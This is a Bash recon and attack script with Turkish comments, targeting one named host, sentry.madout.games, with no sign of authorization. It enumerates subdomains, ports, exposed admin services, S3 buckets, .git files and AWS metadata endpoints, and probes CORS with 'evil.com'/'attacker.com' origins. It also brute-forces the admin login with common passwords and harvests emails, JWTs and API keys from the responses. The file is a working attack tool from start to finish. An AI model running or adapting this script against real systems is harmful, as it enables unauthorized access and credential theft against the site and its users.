#!/bin/bash

# ============================================
# SENTRY SCANNER - DNS VALIDATION DÜZELTİLDİ
# dig/host arka planda çalışır, takılma yok
# ============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

BASE="https://sentry.madout.games"
BASE_HTTP="http://sentry.madout.games"
OUTPUT_DIR="sentry_results"
TIMEOUT=2
mkdir -p "$OUTPUT_DIR" "$OUTPUT_DIR/data"

echo -e "${BLUE}=====================================${NC}"
echo -e "${BLUE}  SENTRY SCANNER${NC}"
echo -e "${BLUE}=====================================${NC}"
echo "Started: $(date)"
echo ""

# ============================================
# 1. CSRF TOKEN
# ============================================
echo -e "${YELLOW}[1] CSRF Token${NC}"
curl -k -s -c "$OUTPUT_DIR/cookies.txt" "$BASE/auth/login/" -o "$OUTPUT_DIR/login_page.html" --connect-timeout $TIMEOUT 2>/dev/null
CSRF_TOKEN=$(grep -oE 'name="csrfmiddlewaretoken" value="[^"]*"' "$OUTPUT_DIR/login_page.html" 2>/dev/null | head -1 | sed 's/.*value="//;s/"//')
[ -n "$CSRF_TOKEN" ] && echo -e "${GREEN}[+] $CSRF_TOKEN${NC}" || echo -e "${RED}[-] Not found${NC}"
echo ""

# ============================================
# 2. HEADER'LAR
# ============================================
echo -e "${YELLOW}[2] Headers${NC}"
curl -k -s -I "$BASE/" --connect-timeout $TIMEOUT 2>/dev/null > "$OUTPUT_DIR/data/headers.txt"
grep -iE "Server|X-Powered-By|X-Frame-Options|Strict-Transport-Security|X-Content-Type-Options" "$OUTPUT_DIR/data/headers.txt" 2>/dev/null | head -10
echo ""

# ============================================
# 3. SSL DETAYLARI
# ============================================
echo -e "${YELLOW}[3] SSL Details${NC}"
if command -v openssl &> /dev/null; then
    openssl s_client -connect sentry.madout.games:443 -servername sentry.madout.games 2>/dev/null </dev/null | openssl x509 -subject -issuer -dates -noout 2>/dev/null > "$OUTPUT_DIR/data/ssl_details.txt" &
    pid=$!
    sleep $TIMEOUT
    kill $pid 2>/dev/null
    wait $pid 2>/dev/null
    if [ -s "$OUTPUT_DIR/data/ssl_details.txt" ]; then
        echo -e "${GREEN}[+] SSL Certificate${NC}"
        cat "$OUTPUT_DIR/data/ssl_details.txt"
    else
        echo -e "${RED}[-] SSL details not available${NC}"
    fi
else
    echo -e "${YELLOW}SKIP (openssl not found)${NC}"
fi
echo ""

# ============================================
# 4. HTTP vs HTTPS
# ============================================
echo -e "${YELLOW}[4] HTTP vs HTTPS${NC}"
http_r=$(curl -k -s -o /dev/null -w "%{http_code}" "$BASE_HTTP/" --connect-timeout $TIMEOUT 2>/dev/null)
if [ "$http_r" != "000" ] && [ "$http_r" != "301" ] && [ "$http_r" != "302" ]; then
    echo -e "${GREEN}[+] HTTP ACCESSIBLE ($http_r)${NC}"
    echo "HTTP accessible: $http_r" >> "$OUTPUT_DIR/data/http_test.txt"
else
    echo -e "${YELLOW}[-] HTTP redirects to HTTPS ($http_r)${NC}"
fi
echo ""

# ============================================
# 5. COOKIE GÜVENLİK
# ============================================
echo -e "${YELLOW}[5] Cookie Security${NC}"
if [ -f "$OUTPUT_DIR/cookies.txt" ]; then
    grep -qi "HttpOnly" "$OUTPUT_DIR/cookies.txt" && echo -e "${GREEN}[+] HttpOnly: YES${NC}" || echo -e "${RED}[-] HttpOnly: NO${NC}"
    grep -qi "Secure" "$OUTPUT_DIR/cookies.txt" && echo -e "${GREEN}[+] Secure: YES${NC}" || echo -e "${RED}[-] Secure: NO${NC}"
    grep -qi "SameSite" "$OUTPUT_DIR/cookies.txt" && echo -e "${GREEN}[+] SameSite: YES${NC}" || echo -e "${RED}[-] SameSite: NO${NC}"
fi
echo ""

# ============================================
# 6. PORT TARAMA
# ============================================
echo -e "${YELLOW}[6] Ports${NC}"
for port in 80 443 8080 8443 3000 5000 8000 9000 9090; do
    r=$(curl -k -s -o /dev/null -w "%{http_code}" --connect-timeout $TIMEOUT "https://sentry.madout.games:$port" 2>/dev/null)
    if [ "$r" != "000" ] && [ "$r" != "404" ]; then
        echo -e "${GREEN}[+] $port ($r)${NC}"
        echo "$port ($r)" >> "$OUTPUT_DIR/data/ports.txt"
    fi
done
echo ""

# ============================================
# 7. SUBDOMAIN HTTP TEST
# ============================================
echo -e "${YELLOW}[7] Subdomains${NC}"
subs=("api" "admin" "dev" "test" "stage" "backup" "dashboard" "panel" "console" "cdn" "static" "media" "auth" "login" "account" "profile" "support" "docs" "wiki" "blog" "forum" "chat" "status")
for s in "${subs[@]}"; do
    r=$(curl -k -s -o /dev/null -w "%{http_code}" "https://$s.madout.games" --connect-timeout $TIMEOUT 2>/dev/null)
    if [ "$r" == "200" ] || [ "$r" == "301" ] || [ "$r" == "302" ] || [ "$r" == "401" ] || [ "$r" == "403" ]; then
        echo -e "${GREEN}[+] $s.madout.games ($r)${NC}"
        echo "$s.madout.games ($r)" >> "$OUTPUT_DIR/data/subdomains.txt"
    fi
done
echo ""

# ============================================
# 8. DNS VALIDATION (DÜZELTİLDİ - ARKA PLANDA)
# ============================================
echo -e "${YELLOW}[8] DNS Validation${NC}"

if command -v dig &> /dev/null; then
    echo -n "Checking DNS records... "
    # Tüm subdomain'leri tek seferde kontrol et (arka planda)
    for s in "${subs[@]}"; do
        (
            ip=$(dig "$s.madout.games" A +short 2>/dev/null | head -1)
            if [ -n "$ip" ]; then
                echo "$s.madout.games -> $ip" >> "$OUTPUT_DIR/data/dns_validated.txt"
            fi
        ) &
    done
    wait
    if [ -s "$OUTPUT_DIR/data/dns_validated.txt" ]; then
        echo -e "${GREEN}OK ($(cat "$OUTPUT_DIR/data/dns_validated.txt" | wc -l) found)${NC}"
        cat "$OUTPUT_DIR/data/dns_validated.txt"
    else
        echo -e "${RED}None found${NC}"
    fi
elif command -v host &> /dev/null; then
    echo -n "Checking DNS records with host... "
    for s in "${subs[@]}"; do
        (
            ip=$(host "$s.madout.games" 2>/dev/null | grep "has address" | head -1 | awk '{print $NF}')
            if [ -n "$ip" ]; then
                echo "$s.madout.games -> $ip" >> "$OUTPUT_DIR/data/dns_validated.txt"
            fi
        ) &
    done
    wait
    if [ -s "$OUTPUT_DIR/data/dns_validated.txt" ]; then
        echo -e "${GREEN}OK ($(cat "$OUTPUT_DIR/data/dns_validated.txt" | wc -l) found)${NC}"
        cat "$OUTPUT_DIR/data/dns_validated.txt"
    else
        echo -e "${RED}None found${NC}"
    fi
else
    echo -e "${YELLOW}SKIP (dig/host not found)${NC}"
fi
echo ""

# ============================================
# 9. SERVİSLER
# ============================================
echo -e "${YELLOW}[9] Services${NC}"
for s in "/phpmyadmin/" "/pma/" "/jenkins/" "/grafana/" "/metrics" "/prometheus/" "/kibana/" "/swagger/" "/minio/" "/wordpress/" "/wp-admin/" "/wp-login.php" "/xmlrpc.php" "/v1/sys/health" "/v1/agent/services" "/lab/" "/tree/" "/notebooks/"; do
    r=$(curl -k -s -o /dev/null -w "%{http_code}" "$BASE$s" --connect-timeout $TIMEOUT 2>/dev/null)
    if [ "$r" == "200" ] || [ "$r" == "302" ] || [ "$r" == "401" ] || [ "$r" == "403" ]; then
        echo -e "${GREEN}[+] $s ($r)${NC}"
        echo "$s ($r)" >> "$OUTPUT_DIR/data/services.txt"
    fi
done
echo ""

# ============================================
# 10. S3 BUCKET
# ============================================
echo -e "${YELLOW}[10] S3 Buckets${NC}"
for b in "sentry.madout.games" "sentry-madout-games" "madout-games" "sentry-backup" "sentry-static" "sentry-media" "sentry-files"; do
    r=$(curl -k -s -o /dev/null -w "%{http_code}" "https://$b.s3.amazonaws.com/" --connect-timeout $TIMEOUT 2>/dev/null)
    [ "$r" == "200" ] || [ "$r" == "403" ] && echo -e "${GREEN}[+] $b ($r)${NC}" && echo "$b ($r)" >> "$OUTPUT_DIR/data/s3_buckets.txt"
done
echo ""

# ============================================
# 11. .git
# ============================================
echo -e "${YELLOW}[11] .git${NC}"
for f in "/.git/config" "/.git/HEAD" "/.git/index" "/.git/objects/"; do
    r=$(curl -k -s -o /dev/null -w "%{http_code}" "$BASE$f" --connect-timeout $TIMEOUT 2>/dev/null)
    [ "$r" == "200" ] && echo -e "${GREEN}[+] $f${NC}" && echo "$f" >> "$OUTPUT_DIR/data/git_found.txt"
done
echo ""

# ============================================
# 12. AWS METADATA
# ============================================
echo -e "${YELLOW}[12] AWS Metadata${NC}"
for p in "http://169.254.169.254/latest/meta-data/" "http://169.254.169.254/latest/user-data/" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"; do
    r=$(curl -k -s -o /dev/null -w "%{http_code}" --connect-timeout $TIMEOUT "$p" 2>/dev/null)
    if [ "$r" == "200" ] || [ "$r" == "401" ]; then
        echo -e "${GREEN}[+] $p ($r)${NC}"
        echo "$p ($r)" >> "$OUTPUT_DIR/data/aws_metadata.txt"
    fi
done
echo ""

# ============================================
# 13. WAYBACK MACHINE
# ============================================
echo -e "${YELLOW}[13] Wayback Machine${NC}"
curl -k -s --connect-timeout $TIMEOUT "https://archive.org/wayback/available?url=sentry.madout.games" > "$OUTPUT_DIR/data/wayback.json" 2>/dev/null
[ -s "$OUTPUT_DIR/data/wayback.json" ] && echo -e "${GREEN}[+] Wayback data saved${NC}" || echo -e "${RED}[-] Wayback data not available${NC}"
echo ""

# ============================================
# 14. GITHUB SEARCH
# ============================================
echo -e "${YELLOW}[14] GitHub Search${NC}"
curl -k -s --connect-timeout $TIMEOUT "https://api.github.com/search/code?q=sentry.madout.games" > "$OUTPUT_DIR/data/github_raw.json" 2>/dev/null
[ -s "$OUTPUT_DIR/data/github_raw.json" ] && echo -e "${GREEN}[+] GitHub search saved${NC}" || echo -e "${RED}[-] GitHub data not available${NC}"
echo ""

# ============================================
# 15. CORS
# ============================================
echo -e "${YELLOW}[15] CORS${NC}"
for origin in "https://evil.com" "https://attacker.com" "null"; do
    r=$(curl -k -s -o /dev/null -w "%{http_code}" -H "Origin: $origin" "$BASE/api/0/" --connect-timeout $TIMEOUT 2>/dev/null)
    [ "$r" == "200" ] || [ "$r" == "302" ] && echo -e "${GREEN}[+] $origin OPEN${NC}" || echo -e "${RED}[-] $origin CLOSED${NC}"
done
echo ""

# ============================================
# 16. GRAPHQL
# ============================================
echo -e "${YELLOW}[16] GraphQL${NC}"
for ep in "/graphql" "/api/graphql" "/query"; do
    r=$(curl -k -s -o /dev/null -w "%{http_code}" -X POST "$BASE$ep" -H "Content-Type: application/json" -d '{"query":"query{__schema{types{name}}}"}' --connect-timeout $TIMEOUT 2>/dev/null)
    [ "$r" == "200" ] && echo -e "${GREEN}[+] $ep OPEN${NC}" && echo "$ep" >> "$OUTPUT_DIR/data/graphql.txt"
done
echo ""

# ============================================
# 17. JWT
# ============================================
echo -e "${YELLOW}[17] JWT${NC}"
grep -roE "eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*" "$OUTPUT_DIR" 2>/dev/null | head -3 | while read t; do
    echo -e "${GREEN}[+] JWT found${NC}"
    echo "$t" >> "$OUTPUT_DIR/data/jwt.txt"
done
echo ""

# ============================================
# 18. RATE LIMIT
# ============================================
echo -e "${YELLOW}[18] Rate Limit${NC}"
limited=0
for i in 1 2 3 4 5; do
    r=$(curl -k -s -o /dev/null -w "%{http_code}" "$BASE/auth/login/" --connect-timeout $TIMEOUT 2>/dev/null)
    if [ "$r" == "429" ]; then
        limited=1
        echo -e "${GREEN}[+] Rate limited${NC}"
        break
    fi
done
[ "$limited" -eq 0 ] && echo -e "${GREEN}[+] No rate limit${NC}"
echo ""

# ============================================
# 19. BRUTE FORCE
# ============================================
echo -e "${YELLOW}[19] Brute Force${NC}"
if [ -n "$CSRF_TOKEN" ]; then
    for pass in "admin" "password" "123456" "qwerty" "admin123" "sentry" "madout" "test" "letmein" "welcome"; do
        r=$(curl -k -s -o /dev/null -w "%{http_code}" -X POST "$BASE/auth/login/" -b "$OUTPUT_DIR/cookies.txt" -c "$OUTPUT_DIR/cookies.txt" -d "csrfmiddlewaretoken=$CSRF_TOKEN&username=admin&password=$pass&op=login" --connect-timeout $TIMEOUT 2>/dev/null)
        if [ "$r" == "302" ] || [ "$r" == "200" ]; then
            echo -e "${GREEN}[+] SUCCESS: $pass${NC}"
            echo "admin:$pass" >> "$OUTPUT_DIR/data/cracked.txt"
            break
        fi
    done
fi
echo ""

# ============================================
# 20. EXTRACT EMAIL/API KEY
# ============================================
echo -e "${YELLOW}[20] Extracting${NC}"
grep -roE "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b" "$OUTPUT_DIR" 2>/dev/null | sort -u | while read e; do
    echo -e "${GREEN}[+] $e${NC}"
    echo "$e" >> "$OUTPUT_DIR/data/emails.txt"
done
grep -roE "(sk-[a-zA-Z0-9]{32,}|pk_[a-zA-Z0-9]{32,}|[a-f0-9]{32,})" "$OUTPUT_DIR" 2>/dev/null | head -3 | while read k; do
    echo -e "${RED}[!] $k${NC}"
    echo "$k" >> "$OUTPUT_DIR/data/api_keys.txt"
done
echo ""

# ============================================
# FINAL REPORT
# ============================================
echo -e "${BLUE}=====================================${NC}"
echo -e "${GREEN}SCAN COMPLETE!${NC}"
echo -e "${BLUE}=====================================${NC}"
echo ""
echo -e "${YELLOW}SUMMARY:${NC}"
echo -e "${CYAN}Subdomains (HTTP): $(cat "$OUTPUT_DIR/data/subdomains.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}Subdomains (DNS): $(cat "$OUTPUT_DIR/data/dns_validated.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}Ports: $(cat "$OUTPUT_DIR/data/ports.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}Services: $(cat "$OUTPUT_DIR/data/services.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}S3 Buckets: $(cat "$OUTPUT_DIR/data/s3_buckets.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}.git exposed: $(cat "$OUTPUT_DIR/data/git_found.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}AWS Metadata: $(cat "$OUTPUT_DIR/data/aws_metadata.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}JWT: $(cat "$OUTPUT_DIR/data/jwt.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}Emails: $(cat "$OUTPUT_DIR/data/emails.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}API Keys: $(cat "$OUTPUT_DIR/data/api_keys.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}GraphQL: $(cat "$OUTPUT_DIR/data/graphql.txt" 2>/dev/null | wc -l)${NC}"
[ -f "$OUTPUT_DIR/data/cracked.txt" ] && echo -e "${RED}[!] CRACKED: $(cat "$OUTPUT_DIR/data/cracked.txt")${NC}"
[ -f "$OUTPUT_DIR/data/wayback.json" ] && [ -s "$OUTPUT_DIR/data/wayback.json" ] && echo -e "${CYAN}Wayback: data saved${NC}"
[ -f "$OUTPUT_DIR/data/github_raw.json" ] && [ -s "$OUTPUT_DIR/data/github_raw.json" ] && echo -e "${CYAN}GitHub: data saved${NC}"
echo -e "${BLUE}=====================================${NC}"
